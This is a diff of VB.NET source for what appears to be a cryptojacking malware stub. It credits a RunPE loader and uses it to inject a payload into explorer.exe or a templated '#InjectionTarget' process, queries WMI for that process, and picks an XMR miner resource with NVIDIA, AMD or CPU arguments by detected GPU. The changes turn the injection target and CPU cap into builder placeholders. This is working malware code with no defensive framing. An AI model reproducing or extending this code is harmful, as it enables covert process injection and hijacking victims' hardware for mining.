@@ -78,7 +78,7 @@ Public Class Program
     Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
         'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
         Try
-            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "C:\Windows\explorer.exe", arg})
+            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "#InjectionDir\#InjectionTarget", arg})
         Catch ex As Exception
         End Try
     End Sub
@@ -87,7 +87,7 @@ Public Class Program
         On Error Resume Next
         Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
         Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
-        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "explorer.exe")
+        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget")
         Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
         Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
         For Each retObject As Object In colProcess
@@ -103,20 +103,18 @@ Public Class Program
             Dim xmr As Byte() = Nothing
 
             If GetGPU.ToLower.Contains("nvidia") Then
-
                 If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
                     Args = "--cuda-bfactor=12 --cuda-bsleep=100"
                     xmr = GetTheResource("#nvidia")
                 Else
-                    Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
+                    Args = "--max-cpu-usage=#MaxCPU"
                     xmr = GetTheResource("#cpu")
                 End If
-
             ElseIf GetGPU.ToLower.Contains("amd") Then
                 Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
                 xmr = GetTheResource("#amd")
             Else
-                Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
+                Args = "--max-cpu-usage=#MaxCPU"
                 xmr = GetTheResource("#cpu")
             End If
 
